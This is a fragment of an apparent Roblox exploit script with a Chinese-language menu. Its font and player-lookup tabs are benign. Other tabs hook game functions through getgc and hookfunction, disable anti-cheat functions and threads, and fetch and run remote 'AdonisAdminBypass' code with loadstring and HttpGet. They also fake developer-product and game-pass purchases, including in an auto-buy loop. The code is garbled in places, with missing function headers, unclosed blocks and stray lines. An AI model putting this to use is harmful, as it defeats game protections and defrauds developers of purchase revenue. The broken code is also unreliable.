    for _, label in ipairs(previewLabels) do
        label.TextSize = 30
    end
    currentFontSize = 30
    saveConfig()
end)

local sectionFontStyle = tabFont:section("字体样式", true)

sectionFontStyle:Toggle("模拟加粗", "FakeBold", false, function(state)
    for _, label in ipairs(previewLabels) do
        if state then
            label.TextStrokeTransparency = 0.5
            label.TextStrokeColor3 = label.TextColor3
        else
            label.TextStrokeTransparency = 1
        end
    end
    saveConfig()
end)

sectionFontStyle:Toggle("模拟斜体", "FakeItalic", false, function(state)
    for _, label in ipairs(previewLabels) do
        label.Rotation = state and 5 or 0
    end
    saveConfig()
end)

sectionFontStyle:Toggle("下划线", "Underline", false, function(state)
    for i, label in ipairs(previewLabels) do
        local baseTexts = {
            "示例文本: tubers93脚本脚本 v1.0.0",
            "ABCDEFGHIJKLMNOPQRSTUVWXYZ",
            "abcdefghijklmnopqrstuvwxyz",
            "1234567890 !@#$%^&*()"
        }
        if state then
            label.Text = "_" .. baseTexts[i] .. "_"
        else
            label.Text = baseTexts[i]
        end
    end
    saveConfig()
end)

local colorPresets = {
    {"红色", Color3.fromRGB(255, 50, 50)},
    {"绿色", Color3.fromRGB(50, 255, 50)},
    {"蓝色", Color3.fromRGB(50, 50, 255)},
    {"黄色", Color3.fromRGB(255, 255, 50)},
    {"紫色", Color3.fromRGB(200, 50, 255)},
    {"白色", Color3.fromRGB(255, 255, 255)},
    {"黑色", Color3.fromRGB(0, 0, 0)},
    {"橙色", Color3.fromRGB(255, 128, 0)},
    {"粉色", Color3.fromRGB(255, 128, 255)},
    {"青色", Color3.fromRGB(0, 255, 255)}
}

for _, preset in ipairs(colorPresets) do
    sectionFontStyle:Button(preset[1], function()
        currentTextColor = preset[2]
        for _, label in ipairs(previewLabels) do
            label.TextColor3 = preset[2]
            if label.TextStrokeTransparency < 1 then
                label.TextStrokeColor3 = preset[2]
            end
        end
        saveConfig()
    end)
end

sectionFontStyle:Button("应用颜色到所有文本", function()
    for _, v in ipairs(game:GetDescendants()) do
        if v:IsA("TextLabel") or v:IsA("TextButton") or v:IsA("TextBox") then
            v.TextColor3 = currentTextColor
        end
    end
end)

local sectionGlobalApply = tabFont:section("全局应用", true)

local excludeTextbox = sectionGlobalApply:Textbox("排除关键词", "ExcludePattern", "输入关键词...", function(text)
    excludePattern = text
    saveConfig()
end)

sectionGlobalApply:Toggle("启用排除列表", "UseExcludeList", false, function()
    saveConfig()
end)

sectionGlobalApply:Button("添加当前预览到排除", function()
    table.insert(excludeList, previewLabel.Text)
    saveConfig()
end)

sectionGlobalApply:Button("清空排除列表", function()
    excludeList = {}
    saveConfig()
end)

sectionGlobalApply:Button("应用到所有文本", function()
    applyCount = 0
    local function applyFont(obj)
        if obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("TextBox") then
            if library.flags["UseExcludeList"] then
                for _, exclude in ipairs(excludeList) do
                    if string.find(obj.Text, exclude) then
                        return
                    end
                end
                if excludePattern ~= "" and excludePattern ~= "输入关键词..." then
                    if string.find(obj.Text, excludePattern) then
                        return
                    end
                end
            end
            
            local shouldModify = false
            if obj:IsA("TextLabel") and library.flags["ModifyLabels"] ~= false then
                shouldModify = true
            elseif obj:IsA("TextButton") and library.flags["ModifyButtons"] ~= false then
                shouldModify = true
            elseif obj:IsA("TextBox") and library.flags["ModifyBoxes"] ~= false then
                shouldModify = true
            end
            
            if shouldModify then
                obj.Font = currentFontEnum
                obj.TextSize = currentFontSize
                obj.TextColor3 = currentTextColor
                obj.TextScaled = false
                applyCount = applyCount + 1
            end
        end
    end
    
    for _, v in ipairs(game:GetDescendants()) do
        applyFont(v)
    end
end)

sectionGlobalApply:Toggle("自动应用新元素", "AutoApplyFont", true, function(state)
    if _G.FontConnection then
        _G.FontConnection:Disconnect()
        _G.FontConnection = nil
    end
    
    if state then
        _G.FontConnection = game.DescendantAdded:Connect(function(v)
            if v:IsA("TextLabel") or v:IsA("TextButton") or v:IsA("TextBox") then
                task.wait(0.1)
                if library.flags["AutoApplyFont"] then
                    if library.flags["UseExcludeList"] then
                        for _, exclude in ipairs(excludeList) do
                            if string.find(v.Text, exclude) then
                                return
                            end
                        end
                        if excludePattern ~= "" and excludePattern ~= "输入关键词..." then
                            if string.find(v.Text, excludePattern) then
                                return
                            end
                        end
                    end
                    v.Font = currentFontEnum
                    v.TextSize = currentFontSize
                    v.TextColor3 = currentTextColor
                    v.TextScaled = false
                    applyCount = applyCount + 1
                end
            end
        end)
    end
    saveConfig()
end)

sectionGlobalApply:Toggle("强制TextScaled关闭", "ForceTextScaled", false, function(state)
    if _G.ScaledConnection then
        _G.ScaledConnection:Disconnect()
        _G.ScaledConnection = nil
    end
    
    if state then
        local function disableScaled(obj)
            if obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("TextBox") then
                obj.TextScaled = false
            end
        end
        for _, v in ipairs(game:GetDescendants()) do
            disableScaled(v)
        end
        _G.ScaledConnection = game.DescendantAdded:Connect(function(v)
            if v:IsA("TextLabel") or v:IsA("TextButton") or v:IsA("TextBox") then
                v.TextScaled = false
            end
        end)
    end
    saveConfig()
end)

local sectionFontRange = tabFont:section("大小限制", true)

sectionFontRange:Slider("最小字体", "MinFontSize", 8, 1, 20, false, function(value)
    _G.MinFontSize = value
    saveConfig()
end)

sectionFontRange:Slider("最大字体", "MaxFontSize", 30, 10, 100, false, function(value)
    _G.MaxFontSize = value
    saveConfig()
end)

sectionFontRange:Toggle("启用大小限制", "EnableSizeLimit", false, function(state)
    if _G.SizeLimitConnection then
        _G.SizeLimitConnection:Disconnect()
        _G.SizeLimitConnection = nil
    end
    
    if state then
        local function clampSize(obj)
            if obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("TextBox") then
                obj.TextSize = math.clamp(obj.TextSize, _G.MinFontSize or 8, _G.MaxFontSize or 30)
            end
        end
        for _, v in ipairs(game:GetDescendants()) do
            clampSize(v)
        end
        _G.SizeLimitConnection = game.DescendantAdded:Connect(function(v)
            if v:IsA("TextLabel") or v:IsA("TextButton") or v:IsA("TextBox") then
                v.TextSize = math.clamp(v.TextSize, _G.MinFontSize or 8, _G.MaxFontSize or 30)
            end
        end)
    end
    saveConfig()
end)

local sectionFontType = tabFont:section("文本类型过滤", true)

sectionFontType:Toggle("修改TextLabel", "ModifyLabels", true, function() saveConfig() end)
sectionFontType:Toggle("修改TextButton", "ModifyButtons", true, function() saveConfig() end)
sectionFontType:Toggle("修改TextBox", "ModifyBoxes", true, function() saveConfig() end)

sectionFontType:Button("仅应用选中类型", function()
    applyCount = 0
    local function applyFiltered(obj)
        if library.flags["ModifyLabels"] and obj:IsA("TextLabel") then
            obj.Font = currentFontEnum
            obj.TextSize = currentFontSize
            obj.TextColor3 = currentTextColor
            applyCount = applyCount + 1
        elseif library.flags["ModifyButtons"] and obj:IsA("TextButton") then
            obj.Font = currentFontEnum
            obj.TextSize = currentFontSize
            obj.TextColor3 = currentTextColor
            applyCount = applyCount + 1
        elseif library.flags["ModifyBoxes"] and obj:IsA("TextBox") then
            obj.Font = currentFontEnum
            obj.TextSize = currentFontSize
            obj.TextColor3 = currentTextColor
            applyCount = applyCount + 1
        end
    end
    
    for _, v in ipairs(game:GetDescendants()) do
        applyFiltered(v)
    end
end)

local sectionFontPreset = tabFont:section("预设配置", true)

sectionFontPreset:Button("默认字体", function()
    for _, label in ipairs(previewLabels) do
        label.TextColor3 = Color3.fromRGB(255, 255, 255)
        label.TextStrokeTransparency = 1
        label.Rotation = 0
        label.Font = Enum.Font.SourceSans
        label.TextSize = 14
    end
    currentFontEnum = Enum.Font.SourceSans
    currentFontSize = 14
    currentTextColor = Color3.fromRGB(255, 255, 255)
    _G.CurrentFont = "SourceSans (默认)"
    saveConfig()
end)

    for _, label in ipairs(previewLabels) do
        label.Font = Enum.Font.GothamBold
        label.TextSize = 24
        label.TextColor3 = Color3.fromRGB(255, 255, 0)
    end
    currentFontEnum = Enum.Font.GothamBold
    currentFontSize = 24
    currentTextColor = Color3.fromRGB(255, 255, 0)
    _G.CurrentFont = "GothamBold (粗黑体)"
    saveConfig()
end)

sectionFontPreset:Button("代码风格", function()
    for _, label in ipairs(previewLabels) do
        label.Font = Enum.Font.RobotoMono
        label.TextSize = 12
        label.TextColor3 = Color3.fromRGB(0, 255, 0)
    end
    currentFontEnum = Enum.Font.RobotoMono
    currentFontSize = 12
    currentTextColor = Color3.fromRGB(0, 255, 0)
    _G.CurrentFont = "RobotoMono (等宽体)"
    saveConfig()

sectionFontPreset:Button("圆润可爱", function()
    for _, label in ipairs(previewLabels) do
        label.Font = Enum.Font.FredokaOne
        label.TextSize = 18
        label.TextColor3 = Color3.fromRGB(255, 128, 255)
    end
    currentFontEnum = Enum.Font.FredokaOne
    currentFontSize = 18
    currentTextColor = Color3.fromRGB(255, 128, 255)
    _G.CurrentFont = "FredokaOne (圆润体)"
    saveConfig()
end)

sectionFontPreset:Button("重置保存配置", function()
    resetAndSaveConfig()
    for _, label in ipairs(previewLabels) do
        label.Font = Enum.Font.SourceSans
        label.TextSize = 14
        label.TextColor3 = Color3.fromRGB(255, 255, 255)
        label.TextStrokeTransparency = 1
        label.Rotation = 0
    end
end)

sectionFontPreset:Button("重置所有文本", function()
    applyCount = 0
    local function resetFont(obj)
        if obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("TextBox") then
            obj.Font = Enum.Font.SourceSans
            obj.TextSize = 14
            obj.TextColor3 = Color3.fromRGB(255, 255, 255)
            obj.TextScaled = false
            obj.TextStrokeTransparency = 1
            obj.Rotation = 0
            applyCount = applyCount + 1
        end
    end
    
    for _, v in ipairs(game:GetDescendants()) do
        resetFont(v)
    end
end)

task.spawn(function()
    task.wait(0.2)
    local savedConfig = loadConfig()
    if savedConfig then
        applyConfigToPreview(savedConfig)
    end
end)
end
do
local playerTab = Window:Tab("玩家查找", '101335649828115')
task.wait(0.1)

local currentUserId = nil
local currentProfileLink = nil
local selectedPlayerName = ""

local searchSection = playerTab:section("搜索玩家", true)

local searchInput = ""
searchSection:Textbox("输入用户名或显示名", "player_search", "", function(text)
    searchInput = text
end)

local statusLabel = searchSection:Label("状态: 等待输入...")

local infoSection = playerTab:section("玩家信息", false)

local usernameLabel = infoSection:Label("用户名: -")
local displayNameLabel = infoSection:Label("显示名: -")
local userIdLabel = infoSection:Label("用户ID: -")
local profileLinkLabel = infoSection:Label("主页链接: -")

local actionSection = playerTab:section("操作", false)

local function searchPlayer(searchText)
    if searchText == "" then
        statusLabel.Text = "状态: 请输入名称"
        return
    end
    
    statusLabel.Text = "状态: 搜索中..."
    
    local Players = game:GetService("Players")
    local foundPlayer = nil
    
    for _, player in ipairs(Players:GetPlayers()) do
        if string.lower(player.Name) == string.lower(searchText) or 
           string.lower(player.DisplayName) == string.lower(searchText) then
            foundPlayer = player
            break
        end
    end
    
    if foundPlayer then
        currentUserId = foundPlayer.UserId
        currentProfileLink = "https://www.roblox.com/users/" .. currentUserId .. "/profile"
        
        usernameLabel.Text = "用户名: " .. foundPlayer.Name
        displayNameLabel.Text = "显示名: " .. foundPlayer.DisplayName
        userIdLabel.Text = "用户ID: " .. currentUserId
        profileLinkLabel.Text = "主页链接: " .. currentProfileLink
        
        statusLabel.Text = "状态: 找到玩家! (在线)"
    else
        local success, userId = pcall(function()
            return Players:GetUserIdFromNameAsync(searchText)
        end)
        
        if success and userId then
            local success2, username = pcall(function()
                return Players:GetNameFromUserIdAsync(userId)
            end)
            
            currentUserId = userId
            currentProfileLink = "https://www.roblox.com/users/" .. currentUserId .. "/profile"
            
            usernameLabel.Text = "用户名: " .. (success2 and username or searchText)
            displayNameLabel.Text = "显示名: (不在服务器)"
            userIdLabel.Text = "用户ID: " .. currentUserId
            profileLinkLabel.Text = "主页链接: " .. currentProfileLink
            
            statusLabel.Text = "状态: 找到玩家 (不在服务器)"
        else
            usernameLabel.Text = "用户名: -"
            displayNameLabel.Text = "显示名: -"
            userIdLabel.Text = "用户ID: -"
            profileLinkLabel.Text = "主页链接: -"
            
            currentUserId = nil
            currentProfileLink = nil
            
            statusLabel.Text = "状态: 未找到玩家"
        end
    end
end

searchSection:Button("搜索", function()
    searchPlayer(searchInput)
end)

actionSection:Button("复制用户ID", function()
    if not currentUserId then
        statusLabel.Text = "状态: 没有ID可复制"
        return
    end
    
    if setclipboard then
        setclipboard(tostring(currentUserId))
        statusLabel.Text = "状态: ID已复制!"
    else
        statusLabel.Text = "状态: 不支持剪贴板"
    end
end)

actionSection:Button("复制主页链接", function()
    if not currentProfileLink then
        statusLabel.Text = "状态: 没有链接可复制"
        return
    end
    
    if setclipboard then
        setclipboard(currentProfileLink)
        statusLabel.Text = "状态: 链接已复制!"
    else
        statusLabel.Text = "状态: 不支持剪贴板"
    end
end)

local serverSection = playerTab:section("服务器玩家", false)

local function getPlayerList()
    local list = {}
    for _, player in ipairs(game:GetService("Players"):GetPlayers()) do
        if player ~= game:GetService("Players").LocalPlayer then
            table.insert(list, player.DisplayName .. " (@" .. player.Name .. ")")
        end
    end
    return list
end

local playerDropdown = serverSection:Dropdown("选择玩家", "server_player_list", getPlayerList(), function(selected)
    local username = selected:match("@([^)]+)")
    if username then
        selectedPlayerName = username
        searchInput = username
        searchPlayer(username)
    end
end)

task.spawn(function()
    while true do
        task.wait(3)
        local success, list = pcall(getPlayerList)
        if success then
            playerDropdown:SetOptions(list)
        end
    end
end)

serverSection:Button("手动刷新列表", function()
    local list = getPlayerList()
    playerDropdown:SetOptions(list)
    statusLabel.Text = "状态: 已刷新玩家列表 (" .. #list .. "人)"
end)

local utilSection = playerTab:section("实用功能", false)

utilSection:Button("复制自己的ID", function()
    local myId = game:GetService("Players").LocalPlayer.UserId
    if setclipboard then
        setclipboard(tostring(myId))
        statusLabel.Text = "状态: 已复制自己的ID: " .. myId
    end
end)

utilSection:Button("打开个人主页", function()
    if currentProfileLink then
        _G.NotifySuccess("提示", "链接已复制，请在浏览器中打开", 3)
        if setclipboard then
            setclipboard(currentProfileLink)
        end
    else
        statusLabel.Text = "状态: 请先搜索玩家"
    end
end)
end
do
local function findfunc(scriptname, scriptClass, Option, cb) 
    if cb == true then 
        if scriptClass == "LocalScript" then 
            for i,v in pairs(getinstances()) do 
                if v:IsA("LocalScript") then 
                    if v.Name == scriptname then 
                        local senv = getsenv(v) 
                        if Option == "Address" then 
                            for i,v in next, senv do 
                                if type(v) == "function" then setclipboard(v) end 
                            end 
                        end 
                        if Option == "Hash" then 
                            for i,v in next, senv do 
                                if type(v) == "function" then 
                                    local n = getfunctionhash(v) 
                                    setclipboard(n) 
                                end 
                            end 
                        end 
                        if Option == "Name" then 
                            for i,v in next, senv do 
                                if type(v) == "function" then 
                                    local n = debug.info(v, "n") 
                                    setclipboard(n) 
                                end 
                            end 
                        end 
                    end 
                end 
            end 
        end 
    end 
    if scriptClass == "ModuleScript" then 
        for i,v in pairs(getinstances()) do 
            if v:IsA("ModuleScript") then 
                if v.Name == scriptname then 
                    local req = require(v) 
                    if Option == "Address" then 
                        for i,v in next, req do 
                            if type(v) == "function" then print(v) end 
                        end 
                    end 
                    if Option == "Hash" then 
                        for i,v in next, req do 
                            if type(v) == "function" then 
                                local n = getfunctionhash(v) 
                                print(n) 
                            end 
                        end 
                    end 
                    if Option == "Name" then 
                        for i,v in next, req do 
                            if type(v) == "function" then 
                                local n = debug.info(v, "n") 
                                print(n) 
                            end 
                        end 
                    end 
                end 
            end 
        end 
    end 
    if cb == false then 
        if scriptClass == "LocalScript" then 
            for i,v in pairs(getinstances()) do 
                if v:IsA("LocalScript") then 
                    if v.Name == scriptname then 
                        local senv = getsenv(v) 
                        if Option == "Address" then 
                            for i,v in next, senv do 
                                if type(v) == "function" then print(v) end 
                            end 
                        end 
                        if Option == "Hash" then 
                            for i,v in next, senv do 
                                if type(v) == "function" then 
                                    local n = getfunctionhash(v) 
                                    print(n) 
                                end 
                            end 
                        end 
                        if Option == "Name" then 
                            for i,v in next, senv do 
                                if type(v) == "function" then 
                                    local n = debug.info(v, "n") 
                                    print(n) 
                                end 
                            end 
                        end 
                    end 
                end 
            end 
        end 
        if scriptClass == "ModuleScript" then 
            for i,v in pairs(getinstances()) do 
                if v:IsA("ModuleScript") then 
                    if v.Name == scriptname then 
                        local req = require(v) 
                        if Option == "Address" then 
                            for i,v in next, req do 
                                if type(v) == "function" then print(v) end 
                            end 
                        end 
                        if Option == "Hash" then 
                            for i,v in next, req do 
                                if type(v) == "function" then 
                                    local n = getfunctionhash(v) 
                                    print(n) 
                                end 
                            end 
                        end 
                        if Option == "Name" then 
                            for i,v in next, req do 
                                if type(v) == "function" then 
                                    local n = debug.info(v, "n") 
                                    print(n) 
                                end 
                            end 
                        end 
                    end 
                end 
            end 
        end 
    end 
end

task.wait(0.1)

basicSection:Textbox("目标标识 (Hash/名称/地址)", "Input0", "", function(text) end)
basicSection:Textbox("函数参数", "Input1", "", function(text) end)
basicSection:Textbox("脚本名称", "Input2", "", function(text) end)
basicSection:Textbox("脚本类型 (LocalScript/ModuleScript)", "Input3", "", function(text) end)
basicSection:Textbox("输出模式 (Hash/Name/Address)", "Input4", "", function(text) end)

basicSection:Toggle("复制到剪贴板", "CBToggle", false, function(state) end)
basicSection:Toggle("包含 Lua 函数 (lclosure)", "lclosureToggle", false, function(state) end)
basicSection:Toggle("包含 C 函数 (cclosure)", "cclosureToggle", false, function(state) end)

basicSection:Button("打印所有函数名 (慢速)", function()
    for i,v in next, getgc(true) do 
        if type(v) == "function" then 
            local n = debug.info(v, "n") 
            print(n) 
            wait(0.2) 
        end 
    end 
end)

    for i,v in next, getgc(true) do 
        if type(v) == "function" then 
            local n = debug.info(v, "n") 
            print(n) 
        end 
    end 
end)

    findfunc(
        tostring(library.flags["Input2"] or ""), 
        tostring(library.flags["Input3"] or ""), 
        tostring(library.flags["Input4"] or ""), 
        library.flags["CBToggle"]
    )
end)

local advancedSection = basicSection1:section("高级操作", true)

advancedSection:Button("Hook 为空值 (Nil)", function()
    for i,v in next, getgc(true) do 
        if type(v) == "function" then 
            local n = debug.info(v, "n") 
            local hash = getfunctionhash(v) 
            local target = library.flags["Input0"]
            if n == target or hash == target or tostring(v) == target then 
                if islclosure(v) == library.flags["lclosureToggle"] or iscclosure(v) == library.flags["cclosureToggle"] then 
                    hookfunction(v, function() return nil end) 
                end 
            end 
        end 
    end 
end)

advancedSection:Button("Hook 为 True (去除冷却)", function()
    for i,v in next, getgc(true) do 
        if type(v) == "function" then 
            local n = debug.info(v, "n") 
            local hash = getfunctionhash(v) 
            local target = library.flags["Input0"]
            if n == target or hash == target or tostring(v) == target then 
                if islclosure(v) == library.flags["lclosureToggle"] or iscclosure(v) == library.flags["cclosureToggle"] then 
                    hookfunction(v, function() return true end) 
                end 
            end 
        end 
    end 
end)

advancedSection:Button("还原函数", function()
    for i,v in next, getgc(true) do 
        if type(v) == "function" then 
            local n = debug.info(v, "n") 
            local hash = getfunctionhash(v) 
            local target = library.flags["Input0"]
            if n == target or hash == target or tostring(v) == target then 
                if islclosure(v) == library.flags["lclosureToggle"] or iscclosure(v) == library.flags["cclosureToggle"] then 
                    restorefunction(v) 
                end 
            end 
        end 
    end 
end)

advancedSection:Button("打印函数常量", function()
    for i,v in next, getgc(true) do 
        if type(v) == "function" then 
            local n = debug.info(v, "n") 
            local hash = getfunctionhash(v) 
            local target = library.flags["Input0"]
            if n == target or hash == target or tostring(v) == target then 
                local con = debug.getconstants(v) 
                print(unpack(con)) 
            end 
        end 
    end 
end)

advancedSection:Button("强制调用函数", function()
    for i,v in next, getgc(true) do 
        if type(v) == "function" then 
            local n = debug.info(v, "n") 
            local hash = getfunctionhash(v) 
            local target = library.flags["Input0"]
            if n == target or hash == target or tostring(v) == target then 
                if islclosure(v) == library.flags["lclosureToggle"] or iscclosure(v) == library.flags["cclosureToggle"] then 
                    v() 
                end 
            end 
        end 
    end 
end)

advancedSection:Button("带参强制调用", function()
    for i,v in next, getgc(true) do 
        if type(v) == "function" then 
            local n = debug.info(v, "n") 
            local hash = getfunctionhash(v) 
            local target = library.flags["Input0"]
            if n == target or hash == target or tostring(v) == target then 
                if islclosure(v) == library.flags["lclosureToggle"] or iscclosure(v) == library.flags["cclosureToggle"] then 
                    v(library.flags["Input1"]) 
                end 
            end 
        end 
    end 
end)
end

local toolsTab = Window:Tab("反作弊类", '110987169760162')
task.wait(0.1)

local nilSection = toolsTab:section("Nil 实例检查", true)

local nilStatus = nilSection:Label("状态: 等待扫描...")

nilSection:Button("扫描隐藏脚本 (getnilinstances)", function()
    if not getnilinstances then
        nilStatus.Text = "错误: 执行器不支持 getnilinstances"
        _G.NotifyWarning("错误", "您的执行器不支持 getnilinstances", 3)
        return
    end
    
    nilStatus.Text = "状态: 扫描中..."
    task.spawn(function()
        local scriptCount = 0
        local totalCount = 0
        
        for index, instance in pairs(getnilinstances()) do
            totalCount = totalCount + 1
            if instance:IsA("LocalScript") then
                scriptCount = scriptCount + 1
                print("发现隐藏脚本:", index, instance.Name, instance.ClassName)
            end
        end
        
        nilStatus.Text = string.format("状态: 找到 %d 个脚本 (共 %d 个实例)", scriptCount, totalCount)
        _G.NotifySuccess("扫描完成", string.format("找到 %d 个隐藏脚本", scriptCount), 3)
    end)
end)

        pcall(function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/v0c0n1337/scripts/refs/heads/main/AdonisAdminBypass.lua"))()
        end)
        pcall(function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/Pixeluted/adoniscries/main/Source.lua"))()

    _G.NotifySuccess("Vitamin A", "远程监听器已加载", 3)
end)

local hashSection = toolsTab:section("哈希破解 (getgc + getfunctionhash)", false)

local acNameInput = ""
local hashInput = ""
local clipboardMode = false
local printMode = true

hashSection:Textbox("反作弊名称", "tool_ac_name", "", function(text)
    acNameInput = text
end)

hashSection:Textbox("握手哈希 (可选)", "tool_hash", "", function(text)
    hashInput = text
end)

hashSection:Toggle("复制到剪贴板", "tool_clipboard", false, function(state)
    clipboardMode = state
end)

hashSection:Toggle("打印到控制台", "tool_print", true, function(state)
    printMode = state
end)

local hashStatus = hashSection:Label("状态: 等待输入...")

hashSection:Button("查找哈希", function()
    if not getgc or not getfunctionhash then
        hashStatus.Text = "错误: 缺少 getgc 或 getfunctionhash"
        return
    end
    
    if acNameInput == "" then
        hashStatus.Text = "错误: 请输入反作弊名称"
        return
    end
    
    hashStatus.Text = "状态: 扫描中..."
    task.spawn(function()
        local foundCount = 0
        local results = {}
        
        for _, func in pairs(getgc()) do
            if type(func) == "function" then
                local success, source = pcall(function()
                    return debug.getinfo(func).source
                end)
                
                if success and source and string.find(string.lower(source), string.lower(acNameInput), 1, true) then
                    foundCount = foundCount + 1
                    local success2, hash = pcall(function()
                        return getfunctionhash(func)
                    end)
                    
                    if success2 and hash then
                        table.insert(results, {source = source, hash = hash})
                        if printMode then
                            print("[哈希查找]", source, "Hash:", hash)
                        end
                    end
                end
            end
        end
        
        hashStatus.Text = string.format("状态: 找到 %d 个函数", foundCount)
        
        if #results == 1 and clipboardMode and setclipboard then
            setclipboard(results[1].hash)
            _G.NotifySuccess("已复制", "哈希已复制到剪贴板", 2)
        end
        
        _G.NotifySuccess("查找完成", string.format("找到 %d 个匹配的函数", foundCount), 3)
    end)
end)

hashSection:Button("绕过所有找到的哈希", function()
    if not getgc or not hookfunction then
        hashStatus.Text = "错误: 缺少必要函数"
        return
    end
    
    if acNameInput == "" then
        hashStatus.Text = "错误: 请输入反作弊名称"
        return
    end
    
    task.spawn(function()
        local hookedCount = 0
        
        for _, func in pairs(getgc()) do
            if type(func) == "function" then
                local success, source = pcall(function()
                    return debug.getinfo(func).source
                end)
                
                if success and source and string.find(string.lower(source), string.lower(acNameInput), 1, true) then
                    pcall(function()
                        hookfunction(func, function(...)
                            return nil
                        end)
                        hookedCount = hookedCount + 1
                    end)
                end
            end
        end
        
        hashStatus.Text = string.format("状态: 已挂钩 %d 个函数", hookedCount)
        _G.NotifySuccess("绕过完成", string.format("已挂钩 %d 个函数", hookedCount), 3)
    end)
end)

hashSection:Button("执行单个哈希绕过", function()
    if not getgc or not hookfunction or not getfunctionhash then
        hashStatus.Text = "错误: 缺少必要函数"
        return
    end
    
    if acNameInput == "" or hashInput == "" then
        hashStatus.Text = "错误: 请输入名称和哈希"
        return
    end
    
    task.spawn(function()
        local hooked = false
        
        for _, func in pairs(getgc()) do
            if type(func) == "function" then
                local success, funcHash = pcall(function()
                    return getfunctionhash(func)
                end)
                
                if success and funcHash == hashInput then
                    pcall(function()
                        hookfunction(func, function(...)
                            local args = {...}
                            if printMode then
                                print("[哈希监控] 函数被调用，参数:", unpack(args))
                            end
                            if clipboardMode and setclipboard then
                                setclipboard(tostring(args[1]) or "nil")
                            end
                            return nil
                        end)
                        hooked = true
                    end)
                    break
                end
            end
        end
        
        if hooked then
            hashStatus.Text = "状态: 已成功挂钩指定哈希"
            _G.NotifySuccess("成功", "已挂钩指定哈希函数", 3)
        else
            hashStatus.Text = "状态: 未找到指定哈希"
        end
    end)
end)

local threadSection = toolsTab:section("协程清理 (Thread Cleaner)", false)

local threadPattern = "<"
local threadIndex = ""

threadSection:Textbox("线程匹配模式 (默认: <)", "tool_thread_pattern", "<", function(text)
    threadPattern = text
end)

threadSection:Textbox("特定索引 (可选，留空处理全部)", "tool_thread_index", "", function(text)
    threadIndex = text
end)

threadSection:Toggle("简单搜索 (精确匹配)", "tool_plain_search", true, function(state)
end)

local threadStatus = threadSection:Label("状态: 等待操作...")

threadSection:Button("列出所有线程", function()
    if not getallthreads and not getreg then
        threadStatus.Text = "错误: 缺少 getallthreads/getreg"
        return
    end
    
    task.spawn(function()
        local threadSource = getallthreads and getallthreads() or getreg()
        local count = 0
        
        for index, value in pairs(threadSource) do
            if type(value) == "thread" then
                count = count + 1
                local success, scriptObj = pcall(function()
                    return getscriptfromthread(value)
                end)
                local name = (success and scriptObj) and scriptObj.Name or "Unknown"
                print(string.format("[%d] %s (状态: %s)", index, name, coroutine.status(value)))
            end
        end
        
        threadStatus.Text = string.format("状态: 共找到 %d 个线程", count)
        _G.NotifySuccess("线程列表", string.format("共 %d 个线程 (查看控制台)", count), 3)
    end)
end)

threadSection:Button("终止匹配线程", function()
    if not getallthreads and not getreg then
        threadStatus.Text = "错误: 缺少必要函数"
        return
    end
    
    if threadPattern == "" then
        threadStatus.Text = "错误: 请输入匹配模式"
        return
    end
    
    task.spawn(function()
        local threadSource = getallthreads and getallthreads() or getreg()
        local killedCount = 0
        local totalCount = 0
        local targetIdx = threadIndex ~= "" and tonumber(threadIndex) or nil
        
        for index, value in pairs(threadSource) do
            if type(value) == "thread" then
                totalCount = totalCount + 1
                local success, scriptObj = pcall(function()
                    return getscriptfromthread(value)
                end)
                local scriptName = (success and scriptObj) and scriptObj.Name or "Unknown"
                
                local match = string.find(scriptName, threadPattern, 1, true)
                if match then
                    if not targetIdx or index == targetIdx then
                        pcall(function()
                            coroutine.close(value)
                            killedCount = killedCount + 1
                            print("已终止线程:", scriptName, "索引:", index)
                        end)
                    end
                end
            end
        end
        
        threadStatus.Text = string.format("状态: 终止了 %d/%d 个线程", killedCount, totalCount)
        _G.NotifySuccess("清理完成", string.format("终止了 %d 个线程", killedCount), 3)
    end)
end)
end
do
local miscTab = Window:Tab("开发者类", '107380207681249')
task.wait(0.1)
local devProductSection = miscTab:section("开发者产品购买", true)

local productList = {}
local selectedProductId = nil
local autoBuyEnabled = false
local productsPurchased = 0

local function fetchDeveloperProducts()
    local success, result = pcall(function()
        local products = {}
        local data = game:GetService("MarketplaceService"):GetDeveloperProductsAsync()
        for _, product in pairs(data:GetCurrentPage()) do
            table.insert(products, {
                id = product.ProductId,
                name = product.Name,
                price = product.PriceInRobux or 0
            })
        end
        return products
    end)
    
    if success then
        productList = result
        local names = {}
        for _, p in ipairs(productList) do
            table.insert(names, p.name .. " (" .. p.price .. "R$)")
        end
        return names
    end
    return {}
end

local productDropdown = devProductSection:Dropdown("选择产品", "misc_devproduct", {}, function(selected)
    for _, p in ipairs(productList) do
        if selected:find(p.name) then
            selectedProductId = p.id
            _G.Notify("产品选择", "已选择: " .. p.name, 2)
            break
        end
    end
end)

devProductSection:Button("刷新产品列表", function()
    local names = fetchDeveloperProducts()
    productDropdown:SetOptions(names)
    _G.Notify("产品列表", "已获取 " .. #names .. " 个产品", 2)
end)

devProductSection:Button("购买选中产品", function()
    if selectedProductId then
        game:GetService("MarketplaceService"):SignalPromptProductPurchaseFinished(
            game.Players.LocalPlayer.UserId, 
            selectedProductId, 
            true
        )
        productsPurchased = productsPurchased + 1
        _G.NotifySuccess("购买成功", "已模拟购买产品 (ID: " .. selectedProductId .. ")", 2)
    else
        _G.NotifyError("错误", "请先选择产品", 2)
    end
end)

devProductSection:Button("购买所有产品", function()
    if #productList == 0 then
        _G.NotifyError("错误", "请先刷新产品列表", 2)
        return
    end
    
    for _, p in ipairs(productList) do
        game:GetService("MarketplaceService"):SignalPromptProductPurchaseFinished(
            game.Players.LocalPlayer.UserId, 
            p.id, 
            true
        )
        productsPurchased = productsPurchased + 1
        task.wait(0.1)
    end
    _G.Notify("批量购买", "已购买 " .. #productList .. " 个产品", 3)
end)

local autoBuyToggle = nil
autoBuyToggle = devProductSection:Toggle("自动购买选中", "misc_autobuy", false, function(state)
    autoBuyEnabled = state
    if state then
        task.spawn(function()
            while autoBuyEnabled do
                if selectedProductId then
                    game:GetService("MarketplaceService"):SignalPromptProductPurchaseFinished(
                        game.Players.LocalPlayer.UserId, 
                        selectedProductId, 
                        true
                    )
                    productsPurchased = productsPurchased + 1
                end
                task.wait(0.5)
            end
        end)
    end
end)

    gpIdInput = text

        game:GetService("MarketplaceService"):SignalPromptGamePassPurchaseFinished(
            game.Players.LocalPlayer,
